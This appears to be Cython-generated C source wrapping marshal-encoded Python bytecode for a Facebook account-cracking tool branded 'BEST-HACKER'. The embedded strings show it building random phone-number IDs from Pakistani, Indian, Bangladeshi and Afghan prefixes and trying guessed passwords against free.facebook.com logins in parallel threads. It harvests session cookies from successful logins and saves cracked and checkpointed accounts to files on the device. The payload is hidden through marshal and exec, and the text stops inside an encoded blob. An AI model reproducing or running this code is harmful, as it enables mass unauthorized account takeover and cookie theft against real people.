\x01\x00Y\x00\x01\x00t\x07d\x04\x83\x01\x01\x00t\x07d\x17\x83\x01\x01\x00t\x07d\x18\x83\x01\x01\x00t\x07d\x04\x83\x01\x01\x00d\x00S\x00)\x19Nr\x0f\x00\x00\x00z"\x1b[1;37m\t \x1a USE OUR COUNTRY CODE \x1a zc\x1b[1;36m     \t     PAK CODES\n     \x1b[1;33m92301, \x1b[1;33m92302 ,\x1b[1;33m92303 ,\x1b[1;33m92305  ...\x1b[0;97mz3\x1b[1;32m============================================ze\x1b[1;36m     \t     INDIA CODES\n     \x1b[1;33m91778, \x1b[1;33m91930 ,\x1b[1;33m91902 ,\x1b[1;33m91712  ...\x1b[0;97mzb\x1b[1;36m     \t     BD CODES\n     \x1b[1;33m88016, \x1b[1;33m88017 ,\x1b[1;33m88018 ,\x1b[1;33m88019  ...\x1b[0;97mz4\x1b[1;32m============================================\nzc\x1b[1;36m     \t     AFG CODES\n     \x1b[1;33m93780, \x1b[1;33m93799 ,\x1b[1;33m93701 ,\x1b[1;33m93777  ...\x1b[0;97mz\x0c PUT CODE : r\x1d\x00\x00\x00z9 EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00s\x00\x00\x00s\x1c\x00\x00\x00\x81\x00|\x00]\t}\x01t\x00\xa0\x01t\x02j\x03\xa1\x01V\x00\x01\x00q\x02d\x00S\x00r\x04\x00\x00\x00)\x04\xda\x06random\xda\x06choicerH\x00\x00\x00Z\x06digits)\x02r3\x00\x00\x00\xda\x01_r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\t<genexpr>\x06\x02\x00\x00s\x04\x00\x00\x00\x02\x80\x1a\x00z\x14i.<locals>.<genexpr>\xe9\x07\x00\x00\x00z\x1b[*] Enter Password Limit : z\x15[*] Enter Password : \xe92\x00\x00\x00)\x01Z\x0bmax_workersz\x13\x1b[1;36m TOTAL IDS: z$\x1b[1;36m THE PROCESS HAS BEEN STARTEDz*\x1b[1;31m USE AEROPLANE MOOD IN EVERY 2 MIN r6\x00\x00\x00z Crack process has been completedz\x1aIds saved in ok.txt,cp.txt)\x12r\x13\x00\x00\x00\xda\x06getuid\xda\x07geteuidr\x14\x00\x00\x00r\x03\x00\x00\x00r\x15\x00\x00\x00r\x17\x00\x00\x00r\x16\x00\x00\x00\xda\x03intr>\x00\x00\x00\xda\x04join\xda\x06append\xda\nThreadPoolr\x0f\x00\x00\x00rJ\x00\x00\x00r9\x00\x00\x00Z\x06submit\xda\x06rcrack)\x10\xda\x04userZ\x03twf\xda\x04codeZ\x05limitZ\x04nmbrZ\x03nmpZ\x05passxZ\x07HamiiIDZ\x05bilalZ\x03pwwZ\x08manshera\xda\x02tlZ\x04love\xda\x03pwx\xda\x03uidZ\x04Emanr\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r"\x00\x00\x00\xdb\x01\x00\x00s`\x00\x00\x00\x04\x02\x04\x02\x06\x02\x06\x02\n\x02\x08\x02\x08\x06\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x02\x08\x01\x08\x02\x08\x02\x08\x02\x0c\x02\x0c\x02\x18\x02\x0c\x02\n\x02\x08\x02\x0c\x02\x04\x02\x08\x02\x0c\x02\x08\x02\x0c\x02\x0c\x02\x06\x02\x0c\x02\x0c\x02\x08\x02\x08\x02\x08\x02\x08\x02\x0e\x02\x08\x02\x08\x02\x0c\x02\x12\x02\x02\xf6\x1c\xf2\x08\x1a\x08\x02\x08\x02\x0c\x02r"\x00\x00\x00c\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\x00\x00\x00\x0b\x00\x00\x00C\x00\x00\x00sp\x02\x00\x00\x90\x01z0|\x01D\x00\x90\x01]\x0e}\x03t\x00\xa0\x01t\x02\xa1\x01}\x04t\x03\xa0\x04\xa1\x00}\x05|\x05\xa0\x05d\x01\xa1\x01j\x06}\x06t\x07\xa0\x08d\x02t\t|\x06\x83\x01\xa1\x02\xa0\nd\x03\xa1\x01t\x07\xa0\x08d\x04t\t|\x06\x83\x01\xa1\x02\xa0\nd\x03\xa1\x01t\x07\xa0\x08d\x05t\t|\x06\x83\x01\xa1\x02\xa0\nd\x03\xa1\x01t\x07\xa0\x08d\x06t\t|\x06\x83\x01\xa1\x02\xa0\nd\x03\xa1\x01d\x07d\x07|\x00|\x03d\x08d\t\x9c\t}\x07i\x00d\nd\x0b\x93\x01d\x0cd\r\x93\x01d\x0ed\x0f\x93\x01d\x10d\x11\x93\x01d\x12d\x13\x93\x01d\x14d\x15\x93\x01d\x16d\x17\x93\x01d\x18d\x19\x93\x01d\x1ad\x1b\x93\x01d\x1cd\x1d\x93\x01d\x1ed\x1f\x93\x01d d!\x93\x01d"d#\x93\x01d$d%\x93\x01d&d\'\x93\x01d(d)\x93\x01d*d+\x93\x01d,d-|\x04d.\x9c\x03\xa5\x01}\x08|\x05j\x0bd/|\x07|\x08d0\x8d\x03j\x06}\t|\x05j\x0c\xa0\r\xa1\x00\xa0\x0e\xa1\x00}\nd1|\nv\x00r\xd8d2\xa0\x0fd3d4\x84\x00|\x05j\x0c\xa0\r\xa1\x00\xa0\x10\xa1\x00D\x00\x83\x01\xa1\x01}\x0b|\x0bd5d6\x85\x02\x19\x00}\x0ct\x11d7|\x0c\x17\x00d8\x17\x00|\x03\x17\x00d9\x17\x00|\x0b\x17\x00d:\x17\x00|\x04\x17\x00d;\x17\x00\x83\x01\x01\x00t\x12|\x05|\x0b\x83\x02\x01\x00t\x13d<d=\x83\x02\xa0\x14|\x0cd8\x17\x00|\x03\x17\x00d>\x17\x00\xa1\x01\x01\x00t\x15\xa0\x16|\x0c\xa1\x01\x01\x00\x01\x00n<d?|\nv\x00\x90\x01r\x13d2\xa0\x0fd@d4\x84\x00|\x05j\x0c\xa0\r\xa1\x00\xa0\x10\xa1\x00D\x00\x83\x01\xa1\x01}\x0b|\x0bdAdB\x85\x02\x19\x00}\x0ct\x11dC|\x0c\x17\x00d8\x17\x00|\x03\x17\x00d;\x17\x00\x83\x01\x01\x00t\x13dDd=\x83\x02\xa0\x14|\x0cd8\x17\x00|\x03\x17\x00dE\x17\x00\xa1\x01\x01\x00t\x17\xa0\x16|\x0c\xa1\x01\x01\x00\x01\x00n\x01q\x04t\x18d\x037\x00a\x18t\x19j\x1a\xa0\x14dFt\x1bt\x18|\x02t\x1ct\x15\x83\x01t\x1ct\x17\x83\x01f\x05\x16\x00\xa1\x01f\x01\x01\x00t\x19j\x1a\xa0\x1d\xa1\x00\x01\x00W\x00d\x00S\x00\x01\x00\x01\x00\x01\x00Y\x00d\x00S\x00)GNrI\x00\x00\x00z\x18name="lsd" value="(.*?)"r6\x00\x00\x00z\x1cname="jazoest" value="(.*?)"z\x19name="m_ts" value="(.*?)"z\x17name="li" value="(.*?)"r \x00\x00\x00z\x06Log In)\tZ\x03lsdZ\x07jazoestZ\x04m_tsZ\x02liZ\ntry_numberZ\x12unrecognized_triesZ\x05emailZ\x04passZ\x05loginZ\tauthorityz\x11free.facebook.comr.\x00\x00\x00Z\x03GETZ\x06schemeZ\x05httpsZ\x06acceptz\x87text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.8z\x0faccept-encodingz\x11gzip, deflate, brz\x0faccept-languagez\x0cen-US,en;q=1z\rcache-controlz#no-cache, no-store, must-revalidateZ\x07refererz\x17https://t.facebook.com/z\tsec-ch-uaz>"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"z\x10sec-ch-ua-mobilez\x02?1z\x12sec-ch-ua-platformZ\x07Windowsz\x0esec-fetch-destZ\x08documentz\x0esec-fetch-modeZ\x08navigatez\x0esec-fetch-sitez\x0bsame-originz\x0esec-fetch-userz\x02?0Z\x06pragmaz\x08no-cacheZ\x08priorityz\x03u=0z\x0ccross-originr\x11\x00\x00\x00)\x03z\x1ccross-origin-resource-policyz\x19upgrade-insecure-requestsz\nuser-agentzBhttps://free.facebook.com/login/device-based/regular/login/?refsrc)\x02\xda\x04dataZ\x07headersZ\x06c_user\xfa\x01;c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00S\x00\x00\x00\xf3\x1c\x00\x00\x00g\x00|\x00]\n\\\x02}\x01}\x02|\x01d\x00\x17\x00|\x02\x17\x00\x91\x02q\x02S\x00\xa9\x01\xfa\x01=r\x05\x00\x00\x00\xa9\x03r3\x00\x00\x00\xda\x03key\xda\x05valuer\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r4\x00\x00\x00\x96\x02\x00\x00\xf3\x02\x00\x00\x00\x1c\x00z\x1arcrack.<locals>.<listcomp>r\x81\x00\x00\x00\xe9\x16\x00\x00\x00u\x19\x00\x00\x00    \x1b[1;32m(B-H-OK\xf0\x9f\x94\xa5)  z\x03 | z\x1b  \n \x1b[1;33mCookie = \x1b[1;32mz\x03 \n z\t  \x1b[0;97mz\x12/sdcard/B-H-OK.txtrF\x00\x00\x00rM\x00\x00\x00Z\ncheckpointc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00S\x00\x00\x00r\x91\x00\x00\x00r\x92\x00\x00\x00r\x05\x00\x00\x00r\x94\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r4\x00\x00\x00\xa6\x02\x00\x00r\x97\x00\x00\x00\xe9\x18\x00\x00\x00\xe9\'\x00\x00\x00u\x19\x00\x00\x00    \x1b[1;30m(B-H-CP\xf0\x9f\xa4\x95)  z\x12/sdcard/B-H-CP.txtz\x02 \nz1\r     %s[BEST-HACKER] [%s/%s]  OK:- %s  CP:- %s \r)\x1er}\x00\x00\x00r~\x00\x00\x00\xda\x04ugen\xda\x08requestsZ\x07Sessionr7\x00\x00\x00r1\x00\x00\x00\xda\x02re\xda\x06searchrJ\x00\x00\x00\xda\x05groupr-\x00\x00\x00r+\x00\x00\x00Z\x08get_dict\xda\x04keysr\x86\x00\x00\x00\xda\x05itemsr\x16\x00\x00\x00rE\x00\x00\x00\xda\x04openrP\x00\x00\x00\xda\x03oksr\x87\x00\x00\x00\xda\x03cps\xda\x04looprN\x00\x00\x00rO\x00\x00\x00rf\x00\x00\x00r9\x00\x00\x00rQ\x00\x00\x00)\rr\x8e\x00\x00\x00r\x8d\x00\x00\x00r\x8c\x00\x00\x00Z\x02psZ\x03pror@\x00\x00\x00Z\x07free_fbZ\x08log_dataZ\rheader_freefbZ\x02loZ\x0blog_cookiesrA\x00\x00\x00Z\x03cidr\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00r\x89\x00\x00\x00>\x02\x00\x00s\x96\x00\x00\x00\x04\x0c\n\x02\n\x02\x08\x02\x0c\x02\x14\x04\x14\x02\x14\x02\x14\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x06\xee\x08\x14\x04\x02\x02\xfe\x04\x04\x02\xfc\x04\x06\x02\xfa\x04\x08\x02\xf8\x04\n\x02\xf6\x04\x0c\x02\xf4\x04\x0e\x02\xf2\x04\x10\x02\xf0\x04\x12\x02\xee\x04\x14\x02\xec\x04\x16\x02\xea\x04\x18\x02\xe8\x04\x1a\x02\xe6\x04\x1c\x02\xe4\x04\x1e\x02\xe2\x04 \x02\xe0\x02"\x02\x02\x02\x02\x08\xda\x12(\x0e\x02\x08\x02\x1e\x02\x0c\x02(\x02\n\x02\x1c\x02\n\x02\x04\x02\n\x02\x1e\x02\x0c\x02\x18\x02\x1c\x02\n\x02\x04\x02\x02\x04\x08\x02$\x02\x10\x02\x06\x02\x06\x02r\x89\x00\x00\x00)kr\x13\x00\x00\x00rN\x00\x00\x00rR\x00\x00\x00r\x9c\x00\x00\x00Z\x04uuidr\x14\x00\x00\x00r\x03\x00\x00\x00r\x15\x00\x00\x00r\x1a\x00\x00\x00r\x18\x00\x00\x00r\x1c\x00\x00\x00Z\x04jsonr}\x00\x00\x00r\x9d\x00\x00\x00rH\x00\x00\x00\xda\x08platform\xda\x06base64Z\x03bs4r#\x00\x00\x00rC\x00\x00\x00Z\x04ressr%\x00\x00\x00r$\x00\x00\x00r&\x00\x00\x00Z\x05waktuZ\x12concurrent.futuresr\'\x00\x00\x00r\x88\x00\x00\x00Z\tmechanizeZ\x13requests.exceptionsr(\x00\x00\x00\xda\x13ModuleNotFoundErrorrE\x00\x00\x00rL\x00\x00\x00Z\x03REDr<\x00\x00\x00r=\x00\x00\x00Z\x06YELLOWZ\x04BLUEZ\x06ORANGErl\x00\x00\x00r;\x00\x00\x00rf\x00\x00\x00ri\x00\x00\x00r`\x00\x00\x00rq\x00\x00\x00rk\x00\x00\x00r:\x00\x00\x00r_\x00\x00\x00Z\x02BNZ\x03BBLZ\x02BPZ\x02BBZ\x02BKZ\x02BHZ\x02BMZ\x02BAZ\x08my_colorr~\x00\x00\x00Z\x05warnaZ\x03now\xda\x08strftimeZ\tdt_stringZ\x07currentZ\x04yearZ\x02taZ\x05monthZ\x02buZ\x03dayZ\x02haZ\x05todayr\xa5\x00\x00\x00r\xa3\x00\x00\x00r\xa4\x00\x00\x00r\x0f\x00\x00\x00rT\x00\x00\x00Z\x02lt\xda\x03cmdr\x85\x00\x00\x00Z\x03ltxrF\x00\x00\x00\xda\x03tagr\x16\x00\x00\x00\xda\x01v\xda\x06updaterJ\x00\x00\x00rX\x00\x00\x00Z\x05ugen2r\x9b\x00\x00\x00r>\x00\x00\x00Z\x02xdZ\x02aa\xda\x01b\xda\x01c\xda\x01dZ\trandrangerS\x00\x00\x00\xda\x01f\xda\x01g\xda\x01hr"\x00\x00\x00\xda\x01j\xda\x01k\xda\x01lZ\x05uaku2r\x87\x00\x00\x00r\x89\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x05\x00\x00\x00r\x08\x00\x00\x00\xda\x08<module>\x01\x00\x00\x00s\xde\x00\x00\x00\x08\x04\x08\x02\x08\x02\x08\x02\x08\x02\n\x02\n\x02\x0e\x02\x04\x08\x08\x02\x08\x16\x08\x16P.\n\x02\x0c\x02\x0c\x02\x08\x02\x0c\x02\x0c\x02\x0c\x02\x0c\x02\x02\x02\x08\x02\x0c\x02\x08\x02\x10\x02\x0c\x02\n\x02\x0e\x02\x02\xfc\x08\x08\x084\x0e\x12\x04\x0e\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x04\x02\x10\x04\x04\xfe\n\x04\x08\x02\n\x02\x08\x02\x06\x02\x06\x02\x06\x02\x08\x02\x04\x02\x04<\x04\x02\x04\x02\x08\x04\x0c\x06\x0c\x02\x0e\x02\n\x02\x08\x02\x06\x02\x04\x04\x04\x02\x02\x06\x08\x02\x04\x02\x04\x02\x04\x02\x0e\x02\x0c\x02\x02\x02\x04\x80\x10\x02\x08\x04\x04\x0e\x04\x02\x0c\x04\x04\x02\x0e\x02\x04\x02\x0e\x02\x0c\x02\x0e\x02\x04\x02\x0c\x02\x04\x02\x0c\x02\x0c\x02\x04\x02B\x02\x0e\x02\x08\x06\x08c\x00\x7f\n\x05'))             # <<<<<<<<<<<<<<
 */
  __pyx_tuple_ = PyTuple_Pack(1, __pyx_kp_b_s_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple_);
  __Pyx_GIVEREF(__pyx_tuple_);
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 1, __pyx_L1_error);
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initoo(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initoo(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_oo(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_oo(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_oo(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'oo' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_oo(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("oo", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 1, __pyx_L1_error);
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_oo) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 1, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "oo")) {
      if (unlikely(PyDict_SetItemString(modules, "oo", __pyx_m) < 0)) __PYX_ERR(0, 1, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  (void)__Pyx_modinit_type_init_code();
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif

  /* "oo.py":5
 * # Python Version 3.10.4
 * 
 * import marshal             # <<<<<<<<<<<<<<
 * exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00@\x00\x00\x00s\xc8\x03\x00\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02d\x00d\x01l\x03Z\x03d\x00d\x01l\x04Z\x04e\x00\xa0\x05d\x02\xa1\x01\x01\x00e\x00\xa0\x05d\x03\xa1\x01\x01\x00G\x00d\x04d\x05\x84\x00d\x05\x83\x02Z\x06d\x06Z\x07d\x07d\x08\x84\x00Z\x08d\td\n\x84\x00Z\td\x0bd\x0c\x84\x00Z\nd\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02d\x00d\x01l\x0bZ\x0bd\x00d\x01l\x0cZ\x0cd\x00d\x01l\rZ\rd\x00d\x01l\x0eZ\x0ed\x00d\x01l\x0fZ\x0fd\x00d\x01l\x10Z\x10d\x00d\x01l\x04Z\x04e\x00\xa0\x05d\x02\xa1\x01\x01\x00d\x00d\rl\x11m\x12Z\x13\x01\x00d\x00d\rl\x11m\x12Z\x12\x01\x00d\x00d\x01l\x03Z\x14d\x00d\x0el\x15m\x16Z\x16\x01\x00d\x00d\x0fl\x15m\x15Z\x15\x01\x00d\x00d\x10l\x02m\x17Z\x17\x01\x00d\x00d\x10l\x02m\x17Z\x18\x01\x00z\x16d\x00d\x01l\x03Z\x03d\x00d\x11l\x19m\x1aZ\x1b\x01\x00d\x00d\x01l\x1cZ\x1cd\x00d\x12l\x1dm\x1eZ\x1e\x01\x00W\x00n\x13\x04\x00e\x1fy\xb1\x01\x00\x01\x00\x01\x00e\x00\xa0\x05d\x13\xa1\x01\x01\x00e\x00\xa0\x05d\x14\xa1\x01\x01\x00Y\x00n\x01w\x00d\x15d\x16\x84\x00Z 